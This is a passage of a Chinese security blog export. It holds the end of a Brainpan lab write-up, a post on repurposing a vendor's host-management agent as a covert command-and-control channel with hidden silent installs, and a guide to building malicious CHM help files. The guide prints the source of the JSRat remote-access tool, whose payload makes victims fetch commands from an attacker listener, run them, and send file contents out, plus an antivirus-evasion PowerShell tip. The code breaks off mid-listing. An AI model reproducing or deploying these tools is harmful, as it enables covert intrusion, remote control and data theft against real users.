<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">扩展</span><br><span class="line">shell中#一般表示注释的意思，所以很多时候认为#!也是注释，但实际上不是，和c语言中头文件一样是声明文件的路径。</span><br><span class="line"></span><br><span class="line">#! /bin/sh 是指此脚本使用/bin/sh 来执行</span><br><span class="line"></span><br><span class="line">#!是特殊的表示符，其后面跟的是解释此脚本的shell的路径，如果没有声明，则脚本将在默认的shell中执行，默认shell是由用户所在的系统定义为执行shell脚本。</span><br></pre></td></tr></table></figure>

<p>所以我们可以在执行此脚本的时候，中间插一个<code>!/bin/sh</code></p>
<p>这时候就会返回一个root权限的会话了</p>
<p><img src="/2022/11/06/Brainpan-1/image-20221106192529634.png" alt="image-20221106192529634"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>提权技巧需要专门开一篇来进行总结，缓冲区溢出第一次接触，耗费时间有点久，不过好在是理解了其中的原理。感觉也挺简单，下次碰到可以自己做了。</p>
]]></content>
      <categories>
        <category>-bachang</category>
      </categories>
  </entry>
  <entry>
    <title>C2-牧云-长亭百川云平台</title>
    <url>/2023/06/16/C2-%E7%89%A7%E4%BA%91-%E9%95%BF%E4%BA%AD%E7%99%BE%E5%B7%9D%E4%BA%91%E5%B9%B3%E5%8F%B0/</url>
    <content><![CDATA[<h1 id="C2-牧云-长亭百川云平台"><a href="#C2-牧云-长亭百川云平台" class="headerlink" title="C2-牧云-长亭百川云平台"></a>C2-牧云-长亭百川云平台</h1><p>某厂商推出的主机管理系统用作红队C2（再次申明：Saas服务实名认证，请勿用于非法用途）。</p>
<p>网上看到的一个思路，复现一下。其实也是很简单的第一个东西，主要是给人提供一种c2的思路而已，要学会举一反三。</p>
<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p>访问<a href="https://rivers.chaitin.cn/workbench%EF%BC%8C%E4%BD%BF%E7%94%A8%E5%BE%AE%E4%BF%A1%E6%B3%A8%E5%86%8C%EF%BC%8C%E5%85%8D%E8%B4%B9%E5%BC%80%E9%80%9A%E4%B8%BB%E6%9C%BA%E7%AE%A1%E7%90%86%E5%8A%A9%E6%89%8B">https://rivers.chaitin.cn/workbench，使用微信注册，免费开通主机管理助手</a></p>
<p>登录到主机管理助手平台，点击绑定主机，即可选择Linux主机和Windows主机安装agent的命令，甚至还有针对于海外主机类型的海外链路，对于红队网络侧的基础设施搭建再也无需购买和部署域名和构建如CS那样的teamserver服务了。</p>
<p><img src="/2023/06/16/C2-%E7%89%A7%E4%BA%91-%E9%95%BF%E4%BA%AD%E7%99%BE%E5%B7%9D%E4%BA%91%E5%B9%B3%E5%8F%B0/image-20230616121932802.png" alt="image-20230616121932802"></p>
<p><img src="/2023/06/16/C2-%E7%89%A7%E4%BA%91-%E9%95%BF%E4%BA%AD%E7%99%BE%E5%B7%9D%E4%BA%91%E5%B9%B3%E5%8F%B0/image-20230616122015774.png" alt="image-20230616122015774"></p>
<p><img src="/2023/06/16/C2-%E7%89%A7%E4%BA%91-%E9%95%BF%E4%BA%AD%E7%99%BE%E5%B7%9D%E4%BA%91%E5%B9%B3%E5%8F%B0/image-20230616122234455.png" alt="image-20230616122234455"></p>
<p>目前兼容 windows10，windows11，windows server 2019，windows server 2022，其他版本很快上线</p>
<h2 id="安装agent"><a href="#安装agent" class="headerlink" title="安装agent"></a>安装agent</h2><p>agent大小差不多有30m，且需要管理员权限运行，但附带某亭签名！</p>
<p><img src="/2023/06/16/C2-%E7%89%A7%E4%BA%91-%E9%95%BF%E4%BA%AD%E7%99%BE%E5%B7%9D%E4%BA%91%E5%B9%B3%E5%8F%B0/image-20230616122302400.png" alt="image-20230616122302400"></p>
<p><strong>静默安装：</strong></p>
<p>跟上文一样，很多场景是只有一个webshell command line或者远程命令执行，无交互式shell时进行点击安装步骤就显得很被动，而且installer并非msi程序，无法使用msiexec命令进行静默安装。</p>
<p>经过后面测试，发现在终端运行installer.exe即可自动安装，得益于牧云自身的设计，无需点击任何确认或者下一步，即可将agent安装且自动运行。</p>
<p><img src="/2023/06/16/C2-%E7%89%A7%E4%BA%91-%E9%95%BF%E4%BA%AD%E7%99%BE%E5%B7%9D%E4%BA%91%E5%B9%B3%E5%8F%B0/image-20230616122611931.png" alt="image-20230616122611931"></p>
<p>可是当目标主机人员在使用的情况下突然弹出安装程序，未免有点小离谱了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">start /min installer.exe</span><br><span class="line"></span><br><span class="line">powershell -WindowStyle Hidden -Command &quot;Start-Process -FilePath &#x27;installer.exe&#x27; -WindowStyle Hidden&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/06/16/C2-%E7%89%A7%E4%BA%91-%E9%95%BF%E4%BA%AD%E7%99%BE%E5%B7%9D%E4%BA%91%E5%B9%B3%E5%8F%B0/image-20230616123858753.png" alt="image-20230616123858753"></p>
<p>安装完成后，需要点击Done，才能将安装程序退出，聪明的你应该已经想到如何解决了,当看到主机管理平台上线后使用，taskkill将安装进程干掉:</p>
<p><code>taskkill /im installer.exe /F</code></p>
<p><img src="/2023/06/16/C2-%E7%89%A7%E4%BA%91-%E9%95%BF%E4%BA%AD%E7%99%BE%E5%B7%9D%E4%BA%91%E5%B9%B3%E5%8F%B0/image-20230616124135908.png" alt="image-20230616124135908"></p>
<p>最后成功</p>
<p><img src="/2023/06/16/C2-%E7%89%A7%E4%BA%91-%E9%95%BF%E4%BA%AD%E7%99%BE%E5%B7%9D%E4%BA%91%E5%B9%B3%E5%8F%B0/image-20230616124246703.png" alt="image-20230616124246703"></p>
<p><img src="/2023/06/16/C2-%E7%89%A7%E4%BA%91-%E9%95%BF%E4%BA%AD%E7%99%BE%E5%B7%9D%E4%BA%91%E5%B9%B3%E5%8F%B0/image-20230616124253558.png" alt="image-20230616124253558"></p>
<p><img src="/2023/06/16/C2-%E7%89%A7%E4%BA%91-%E9%95%BF%E4%BA%AD%E7%99%BE%E5%B7%9D%E4%BA%91%E5%B9%B3%E5%8F%B0/image-20230616124304561.png" alt="image-20230616124304561"></p>
<p>值得一提的是，在管理端解绑主机之后，删除被控端会自己删除</p>
<p><img src="/2023/06/16/C2-%E7%89%A7%E4%BA%91-%E9%95%BF%E4%BA%AD%E7%99%BE%E5%B7%9D%E4%BA%91%E5%B9%B3%E5%8F%B0/image-20230616124539803.png" alt="image-20230616124539803"></p>
<p><img src="/2023/06/16/C2-%E7%89%A7%E4%BA%91-%E9%95%BF%E4%BA%AD%E7%99%BE%E5%B7%9D%E4%BA%91%E5%B9%B3%E5%8F%B0/image-20230616124610380.png" alt="image-20230616124610380"></p>
<p>已经自己删除了，大概解绑之后的五六秒钟就会自己删除。</p>
<h1 id="局限"><a href="#局限" class="headerlink" title="局限"></a>局限</h1><ul>
<li>需要管理员权限进行安装</li>
<li>windows 10以上版本</li>
<li>Sass服务提供，懂得都懂，请合法合规使用</li>
</ul>
<p>大部分内容参考:<a href="https://mp.weixin.qq.com/s/JlL4GWRFeIFgpRYx8OrdNg">https://mp.weixin.qq.com/s/JlL4GWRFeIFgpRYx8OrdNg</a></p>
<p>主要是自己复现一下懒得写，有现成的文章为什么不复制呢（），也没有用作盈利嘛~</p>
]]></content>
      <categories>
        <category>-tools</category>
      </categories>
  </entry>
  <entry>
    <title>CHM攻击总结</title>
    <url>/2022/10/09/CHM%E6%94%BB%E5%87%BB%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="CHM攻击总结"><a href="#CHM攻击总结" class="headerlink" title="CHM攻击总结"></a>CHM攻击总结</h1><p>“Compiled Help (or HTML) Manual”简称chm，即“已编译的帮助文件”，是由微软开发文档格式，可以被认为是一种类似于RAR等压缩打包的文件格式（可以使用7z等压缩软件直接打开)， 可以包含html、图片、脚本语言以及其他文件。</p>
<p>当攻击者恶意利用此文件时，通常会在CHM文件内包含恶意脚本和文件，用户打开chm时便会触发恶意代码执行。著名恶意渗透框架如nishang等都支持生成CHM的恶意恶意利用。本文介绍了如何手动制作CHM，并梳理了常见的攻击利用方式。</p>
<h1 id="手动制作CHM文件"><a href="#手动制作CHM文件" class="headerlink" title="手动制作CHM文件"></a>手动制作CHM文件</h1><p>chm文件由一系列html文件编译在一起，形成帮助文档，主要依靠一些配置文件来组织CHM的文件结构。</p>
<h2 id="定义HTML-help-project-hhp-配置文件"><a href="#定义HTML-help-project-hhp-配置文件" class="headerlink" title="定义HTML help project (.hhp)配置文件"></a><strong>定义HTML help project (.hhp)配置文件</strong></h2><p>hhp文件是在编译时用到的主要文件。其中定义了主页、chm文件名、标题，以及包含的文件等一系列信息。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[OPTIONS] </span><br><span class="line">Compatibility=1.1 or later</span><br><span class="line">Compiled file=PocCalc.chm                 // 指定生成的CHM文件名</span><br><span class="line">Contents file=Table of Contents.hhc       // 指定hhc文件</span><br><span class="line">Index file=Index.hhk                      // 指定hhk文件</span><br><span class="line">Default topic=poc.html                    // 指定首页的html文件名</span><br><span class="line">Title=PocCalc                             // 标题</span><br><span class="line">Display compile progress=No</span><br><span class="line">Language=0x410 Italian (Italy)</span><br><span class="line">Full-text search=Yes                </span><br><span class="line"></span><br><span class="line">[FILES] </span><br><span class="line">poc.html                                  // 需要编译打包进CHM的文件</span><br><span class="line">GoogleUpdate.exe </span><br><span class="line">goopdate.dll</span><br><span class="line"></span><br><span class="line">[INFOTYPES]</span><br></pre></td></tr></table></figure>

<h2 id="编写html源码文件"><a href="#编写html源码文件" class="headerlink" title="编写html源码文件"></a>编写html源码文件</h2><p>HTML格式源码文件用来存储CHM当中的文本内容，管理组织图片, 按钮，快捷方式等呈现方式。当被攻击者利用时，常常会通过ShortCut的方式添加恶意命令，在Item1的Value中指定需要运行的进程和参数。</p>
<p>下面是一个通过cmd启动计算器的示例</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;&lt;title&gt;calc poc&lt;/title&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;</span><br><span class="line">command exec</span><br><span class="line">&lt;OBJECT id=x classid=&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot; width=1 height=1&gt;</span><br><span class="line">&lt;PARAM name=&quot;Command&quot; value=&quot;ShortCut&quot;&gt;</span><br><span class="line">&lt;PARAM name=&quot;Button&quot; value=&quot;Bitmap::shortcut&quot;&gt;</span><br><span class="line">&lt;PARAM name=&quot;Item1&quot; value=&#x27;,cmd /c, Calc&#x27;&gt;</span><br><span class="line">&lt;PARAM name=&quot;Item2&quot; value=&quot;273,1,1&quot;&gt;</span><br><span class="line">&lt;/OBJECT&gt;</span><br><span class="line">&lt;SCRIPT&gt;</span><br><span class="line">x.Click();</span><br><span class="line">&lt;/SCRIPT&gt;</span><br><span class="line">&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h2 id="定义hhk文件"><a href="#定义hhk文件" class="headerlink" title="定义hhk文件"></a><strong>定义hhk文件</strong></h2><p>hhk文件是html格式的文件，用于保存CHM中关键字索引目录的内容， 在<code>&lt;BODY&gt;</code>标签中以列举所有需要嵌入到chm文件中的附件文件对象，对象包含对象名Name和编译对象所在路径Local两个参数，设置的对象会在编译的时候编译到chm文件中。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML//EN&quot;&gt;</span><br><span class="line">&lt;HTML&gt; </span><br><span class="line">   &lt;HEAD&gt; </span><br><span class="line">   &lt;meta name=&quot;GENERATOR&quot; content=&quot;Microsoft® HTML Help Workshop 4.1&quot;&gt;</span><br><span class="line">   &lt;!-- Sitemap 1.0 --&gt; </span><br><span class="line">   &lt;/HEAD&gt;</span><br><span class="line">   &lt;BODY&gt; </span><br><span class="line">   &lt;UL&gt; </span><br><span class="line">   &lt;LI&gt;&lt;OBJECT type=&quot;text/sitemap&quot;&gt;</span><br><span class="line">       &lt;param name=&quot;Name&quot; value=&quot;GoogleUpdate&quot;&gt;</span><br><span class="line">       &lt;param name=&quot;Local&quot; value=&quot;GoogleUpdate.exe&quot;&gt;</span><br><span class="line">       &lt;/OBJECT&gt; </span><br><span class="line">   &lt;LI&gt;&lt;OBJECT type=&quot;text/sitemap&quot;&gt;</span><br><span class="line">       &lt;param name=&quot;Name&quot; value=&quot;goopdate&quot;&gt;</span><br><span class="line">       &lt;param name=&quot;Local&quot; value=&quot;goopdate.dll&quot;&gt;</span><br><span class="line">       &lt;/OBJECT&gt;</span><br><span class="line">   &lt;/UL&gt;</span><br><span class="line">   &lt;/BODY&gt;</span><br><span class="line">&lt;/HTML&gt;</span><br></pre></td></tr></table></figure>

<h2 id="定义hhc文件"><a href="#定义hhc文件" class="headerlink" title="定义hhc文件"></a><strong>定义hhc文件</strong></h2><p>hhc文件也是html格式的文件，在hhc文件中，用<UL>和<LI>两个标签定义了带有层级关系中列表,并在其中以<code>&lt;OBJECT&gt;</code>的形式嵌入了html页面对象。利用列表的层级关系，构造了最终chm文件的层级关系。</LI></UL></p>
<p>第一个sitemap对象中包含的html文件将作为首页展示，其中的恶意代码将自动加载执行。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML//EN&quot;&gt; </span><br><span class="line">&lt;HTML&gt; </span><br><span class="line">    &lt;HEAD&gt; </span><br><span class="line">        &lt;meta name=&quot;GENERATOR&quot; content=&quot;Microsoft® HTML Help Workshop 4.1&quot;&gt; </span><br><span class="line">        &lt;!-- Sitemap 1.0 --&gt; </span><br><span class="line">    &lt;/HEAD&gt; </span><br><span class="line">    &lt;BODY&gt; </span><br><span class="line">        &lt;OBJECT type=&quot;text/site properties&quot;&gt;</span><br><span class="line">            &lt;param name=&quot;ImageType&quot; value=&quot;Folder&quot;&gt;</span><br><span class="line">        &lt;/OBJECT&gt; </span><br><span class="line">        &lt;UL&gt;</span><br><span class="line">            &lt;LI&gt; &lt;OBJECT type=&quot;text/sitemap&quot;&gt;</span><br><span class="line">                &lt;param name=&quot;Name&quot; value=&quot;Notice&quot;&gt;</span><br><span class="line">                &lt;param name=&quot;Local&quot; value=&quot;poc.html&quot;&gt;</span><br><span class="line">                &lt;param name=&quot;ImageNumber&quot; value=&quot;1&quot;&gt;</span><br><span class="line">                &lt;/OBJECT&gt;</span><br><span class="line">         &lt;/UL&gt;</span><br><span class="line">     &lt;/BODY&gt;</span><br><span class="line">&lt;/HTML&gt;</span><br></pre></td></tr></table></figure>

<h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">最后我们就可以使用hhc.exe将以上文件编译打包成.chm文档。</span><br><span class="line"></span><br><span class="line">命令格式：hhc.exe &lt;hhp文件路径&gt;</span><br></pre></td></tr></table></figure>

<h1 id="工具制作木马"><a href="#工具制作木马" class="headerlink" title="工具制作木马"></a>工具制作木马</h1><p><code>python MyJSRat.py -i 192.168.100.1 -p 8082 -c &quot;&quot;</code></p>
<p><a href="https://github.com/Ridter/MyJSRat">Ridter/MyJSRat: This is JSRat.ps1 in Python (github.com)</a></p>
<p>这个是原工具地址，但是由于一直报错，我不得已改了一些里面的代码，改了一万年o(╥﹏╥)o(代码我就放最后把，太占空间了),工具只修复了命令执行功能，交互功能没弄好，有能力的大佬可以自己看看。</p>
<p>c参数里面用命令就可以了，最后把生成的payload放到chm里面就可以</p>
<p><code>powershell -ep bypass -enc</code>base64加载，这样可以过windows自身的防御，火绒也可过，但是360不行，云沙箱也报毒。</p>
<h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># JSRat Server</span></span><br><span class="line"><span class="comment"># By: Evi1cg</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="keyword">import</span> optparse, os, socket, SocketServer, sys , re</span><br><span class="line"><span class="keyword">from</span> BaseHTTPServer <span class="keyword">import</span> BaseHTTPRequestHandler, HTTPServer</span><br><span class="line"><span class="keyword">from</span> classes.colors <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests <span class="comment"># Used for --find-ip option, otherwise not needed</span></span><br><span class="line"><span class="keyword">global</span> command</span><br><span class="line">command = <span class="string">&#x27;ver&#x27;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">  <span class="keyword">import</span> readline</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">  error(<span class="string">&quot;No Python Readline&quot;</span>)</span><br><span class="line">  pad(); bad(<span class="string">&quot;No history support as a result, sorry...&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">banner</span>():</span></span><br><span class="line">  cls()</span><br><span class="line">  <span class="built_in">print</span> red(<span class="string">&quot;\nJSRat Server&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cls</span>():</span></span><br><span class="line">  <span class="keyword">if</span> os.name == <span class="string">&#x27;nt&#x27;</span> <span class="keyword">or</span> sys.platform.startswith(<span class="string">&#x27;win&#x27;</span>):</span><br><span class="line">    os.system(<span class="string">&#x27;cls&#x27;</span>)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    os.system(<span class="string">&#x27;clear&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">internal_ip</span>():</span></span><br><span class="line">  <span class="string">&#x27;Check Internal IP&#x27;</span> <span class="comment"># Google IP address used...</span></span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    iip = [(s.connect((<span class="string">&#x27;8.8.8.8&#x27;</span>, <span class="number">80</span>)), s.getsockname()[<span class="number">0</span>], s.close()) <span class="keyword">for</span> s <span class="keyword">in</span> [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][<span class="number">0</span>][<span class="number">1</span>]</span><br><span class="line">  <span class="keyword">except</span>:</span><br><span class="line">    error(<span class="string">&quot;Problem resolving internal IP!&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Problem resolving internal IP!&quot;</span></span><br><span class="line">  <span class="keyword">return</span> iip</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">external_ip</span>():</span></span><br><span class="line">  <span class="string">&#x27;Check External IP using ip.chinaz.com&#x27;</span></span><br><span class="line">  url = <span class="string">&#x27;http://ip.chinaz.com/getip.aspx&#x27;</span> <span class="comment"># Simple External IP Check using dyndns...</span></span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    headers = &#123; <span class="string">&#x27;User-agent&#x27;</span> : <span class="string">&#x27;Python External IP Checker&#x27;</span> &#125; </span><br><span class="line">    res = requests.get( url, headers=headers, timeout=<span class="number">30.0</span> )</span><br><span class="line">    body = res.text</span><br><span class="line">    extip= re.search(<span class="string">r&quot;ip\:&#x27;(.*?)&#x27;\,addre&quot;</span>, body)</span><br><span class="line">  <span class="keyword">except</span>:</span><br><span class="line">    error(<span class="string">&quot;Problem resolving extrernal IP!&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Problem resolving extrernal IP!&quot;</span></span><br><span class="line">  <span class="keyword">return</span> <span class="string">&quot;wang zhi gua le ,wo zhao le ban tian baocuo&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">jsrat</span>():</span></span><br><span class="line">  <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">      Build &amp; Return the core JS code to operate JSRat on victim</span></span><br><span class="line"><span class="string">      Essentially serve up additional JS to be evaluated by client based on need</span></span><br><span class="line"><span class="string">  &quot;&quot;&quot;</span></span><br><span class="line">  jsrat_code = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">			while(true) &#123;</span></span><br><span class="line"><span class="string">				h = new ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);</span></span><br><span class="line"><span class="string">				h.SetTimeouts(0, 0, 0, 0);</span></span><br><span class="line"><span class="string">                        	try &#123;</span></span><br><span class="line"><span class="string">					h.Open(&quot;GET&quot;,&quot;http://&quot;&quot;&quot;</span>+bind_ip+<span class="string">&quot;:&quot;</span>+<span class="built_in">str</span>(listener_port)+<span class="string">&quot;&quot;&quot;/rat&quot;,false);</span></span><br><span class="line"><span class="string">					h.Send();</span></span><br><span class="line"><span class="string">					c = h.ResponseText;</span></span><br><span class="line"><span class="string">                            		if(c==&quot;delete&quot;) &#123;</span></span><br><span class="line"><span class="string">                                		p=new ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);</span></span><br><span class="line"><span class="string">                                		p.SetTimeouts(0, 0, 0, 0);</span></span><br><span class="line"><span class="string">					    	p.Open(&quot;POST&quot;,&quot;http://&quot;&quot;&quot;</span>+bind_ip+<span class="string">&quot;:&quot;</span>+<span class="built_in">str</span>(listener_port)+<span class="string">&quot;&quot;&quot;/rat&quot;,false);</span></span><br><span class="line"><span class="string">					    	p.Send(&quot;[Next Input should be the File to Delete]&quot;);</span></span><br><span class="line"><span class="string">                                		g = new ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);</span></span><br><span class="line"><span class="string">                                		g.SetTimeouts(0, 0, 0, 0);</span></span><br><span class="line"><span class="string">                                		g.Open(&quot;GET&quot;,&quot;http://&quot;&quot;&quot;</span>+bind_ip+<span class="string">&quot;:&quot;</span>+<span class="built_in">str</span>(listener_port)+<span class="string">&quot;&quot;&quot;/rat&quot;,false);</span></span><br><span class="line"><span class="string">					    	g.Send();</span></span><br><span class="line"><span class="string">					    	d = g.ResponseText;</span></span><br><span class="line"><span class="string">                                		fso1=new ActiveXObject(&quot;Scripting.FileSystemObject&quot;);</span></span><br><span class="line"><span class="string">                                		f =fso1.GetFile(d);</span></span><br><span class="line"><span class="string">                                		f.Delete();</span></span><br><span class="line"><span class="string">                                		p=new ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);</span></span><br><span class="line"><span class="string">                                		p.SetTimeouts(0, 0, 0, 0);</span></span><br><span class="line"><span class="string">					    	p.Open(&quot;POST&quot;,&quot;http://&quot;&quot;&quot;</span>+bind_ip+<span class="string">&quot;:&quot;</span>+<span class="built_in">str</span>(listener_port)+<span class="string">&quot;&quot;&quot;/rat&quot;,false);</span></span><br><span class="line"><span class="string">					    	p.Send(&quot;[Delete Success]\\n&quot;);</span></span><br><span class="line"><span class="string">                                		continue;</span></span><br><span class="line"><span class="string">                            		&#125; else if(c==&quot;download&quot;) &#123;</span></span><br><span class="line"><span class="string">                                		p=new ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);</span></span><br><span class="line"><span class="string">                                		p.SetTimeouts(0, 0, 0, 0);</span></span><br><span class="line"><span class="string">					    	p.Open(&quot;POST&quot;,&quot;http://&quot;&quot;&quot;</span>+bind_ip+<span class="string">&quot;:&quot;</span>+<span class="built_in">str</span>(listener_port)+<span class="string">&quot;&quot;&quot;/rat&quot;,false);</span></span><br><span class="line"><span class="string">					    	p.Send(&quot;[Next Input should be the File to download]&quot;);</span></span><br><span class="line"><span class="string">                                		g = new ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);</span></span><br><span class="line"><span class="string">                                		g.SetTimeouts(0, 0, 0, 0);</span></span><br><span class="line"><span class="string">                                		g.Open(&quot;GET&quot;,&quot;http://&quot;&quot;&quot;</span>+bind_ip+<span class="string">&quot;:&quot;</span>+<span class="built_in">str</span>(listener_port)+<span class="string">&quot;&quot;&quot;/rat&quot;,false);</span></span><br><span class="line"><span class="string">					    	g.Send();</span></span><br><span class="line"><span class="string">					    	d = g.ResponseText;</span></span><br><span class="line"><span class="string">                                		fso1=new ActiveXObject(&quot;Scripting.FileSystemObject&quot;);</span></span><br><span class="line"><span class="string">                                		f=fso1.OpenTextFile(d,1);</span></span><br><span class="line"><span class="string">                                		g=f.ReadAll();</span></span><br><span class="line"><span class="string">                                		f.Close();</span></span><br><span class="line"><span class="string">                                		p=new ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);</span></span><br><span class="line"><span class="string">                                		p.SetTimeouts(0, 0, 0, 0);</span></span><br><span class="line"><span class="string">					    	p.Open(&quot;POST&quot;,&quot;http://&quot;&quot;&quot;</span>+bind_ip+<span class="string">&quot;:&quot;</span>+<span class="built_in">str</span>(listener_port)+<span class="string">&quot;&quot;&quot;/download&quot;,false);</span></span><br><span class="line"><span class="string">					    	p.Send(g);</span></span><br><span class="line"><span class="string">                                		continue;</span></span><br><span class="line"><span class="string">                          		&#125; else if(c==&quot;read&quot;) &#123;</span></span><br><span class="line"><span class="string">                                		p=new ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);</span></span><br><span class="line"><span class="string">                                		p.SetTimeouts(0, 0, 0, 0);</span></span><br><span class="line"><span class="string">					    	p.Open(&quot;POST&quot;,&quot;http://&quot;&quot;&quot;</span>+bind_ip+<span class="string">&quot;:&quot;</span>+<span class="built_in">str</span>(listener_port)+<span class="string">&quot;&quot;&quot;/rat&quot;,false);</span></span><br><span class="line"><span class="string">					    	p.Send(&quot;[Next Input should be the File to Read]&quot;);</span></span><br><span class="line"><span class="string">                                		g = new ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);</span></span><br><span class="line"><span class="string">                                		g.SetTimeouts(0, 0, 0, 0);</span></span><br><span class="line"><span class="string">                                		g.Open(&quot;GET&quot;,&quot;http://&quot;&quot;&quot;</span>+bind_ip+<span class="string">&quot;:&quot;</span>+<span class="built_in">str</span>(listener_port)+<span class="string">&quot;&quot;&quot;/rat&quot;,false);</span></span><br><span class="line"><span class="string">					    	g.Send();</span></span><br><span class="line"><span class="string">					    	d = g.ResponseText;</span></span><br><span class="line"><span class="string">                                		fso1=new ActiveXObject(&quot;Scripting.FileSystemObject&quot;);</span></span><br><span class="line"><span class="string">                                		f=fso1.OpenTextFile(d,1);</span></span><br><span class="line"><span class="string">                                		g=f.ReadAll();</span></span><br><span class="line"><span class="string">                                		f.Close();</span></span><br><span class="line"><span class="string">                                		p=new ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);</span></span><br><span class="line"><span class="string">                                		p.SetTimeouts(0, 0, 0, 0);</span></span><br><span class="line"><span class="string">					    	p.Open(&quot;POST&quot;,&quot;http://&quot;&quot;&quot;</span>+bind_ip+<span class="string">&quot;:&quot;</span>+<span class="built_in">str</span>(listener_port)+<span class="string">&quot;&quot;&quot;/rat&quot;,false);</span></span><br><span class="line"><span class="string">					    	p.Send(g + &quot;\\n&quot;);</span></span><br><span class="line"><span class="string">                                		continue;</span></span><br><span class="line"><span class="string">                            		&#125; else if(c==&quot;run&quot;) &#123;</span></span><br><span class="line"><span class="string">                                		p=new ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);</span></span><br><span class="line"><span class="string">                                		p.SetTimeouts(0, 0, 0, 0);</span></span><br><span class="line"><span class="string">					    	p.Open(&quot;POST&quot;,&quot;http://&quot;&quot;&quot;</span>+bind_ip+<span class="string">&quot;:&quot;</span>+<span class="built_in">str</span>(listener_port)+<span class="string">&quot;&quot;&quot;/rat&quot;,false);</span></span><br><span class="line"><span class="string">					    	p.Send(&quot;[Next Input should be the File to Run]&quot;);</span></span><br><span class="line"><span class="string">                                		g = new ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);</span></span><br><span class="line"><span class="string">                                		g.SetTimeouts(0, 0, 0, 0);</span></span><br><span class="line"><span class="string">                                		g.Open(&quot;GET&quot;,&quot;http://&quot;&quot;&quot;</span>+bind_ip+<span class="string">&quot;:&quot;</span>+<span class="built_in">str</span>(listener_port)+<span class="string">&quot;&quot;&quot;/rat&quot;,false);</span></span><br><span class="line"><span class="string">					    	g.Send();</span></span><br><span class="line"><span class="string">					    	d = g.ResponseText;</span></span><br><span class="line"><span class="string">                                		r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(d,0,true);</span></span><br><span class="line"><span class="string">                                		p=new ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);</span></span><br><span class="line"><span class="string">                                		p.SetTimeouts(0, 0, 0, 0);</span></span><br><span class="line"><span class="string">					    	p.Open(&quot;POST&quot;,&quot;http://&quot;&quot;&quot;</span>+bind_ip+<span class="string">&quot;:&quot;</span>+<span class="built_in">str</span>(listener_port)+<span class="string">&quot;&quot;&quot;/rat&quot;,false);</span></span><br><span class="line"><span class="string">                                		p.Send(&quot;[Run Success]\\n&quot;);</span></span><br><span class="line"><span class="string">                                		continue;      </span></span><br><span class="line"><span class="string">                            		&#125;else if(c==&quot;upload&quot;) &#123;</span></span><br><span class="line"><span class="string">                                		p=new ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);</span></span><br><span class="line"><span class="string">                        		 	p.SetTimeouts(0, 0, 0, 0);</span></span><br><span class="line"><span class="string">					    	p.Open(&quot;POST&quot;,&quot;http://&quot;&quot;&quot;</span>+bind_ip+<span class="string">&quot;:&quot;</span>+<span class="built_in">str</span>(listener_port)+<span class="string">&quot;&quot;&quot;/rat&quot;,false);</span></span><br><span class="line"><span class="string">					    	p.Send(&quot;[Start to Upload]&quot;);</span></span><br><span class="line"><span class="string">                                		g = new 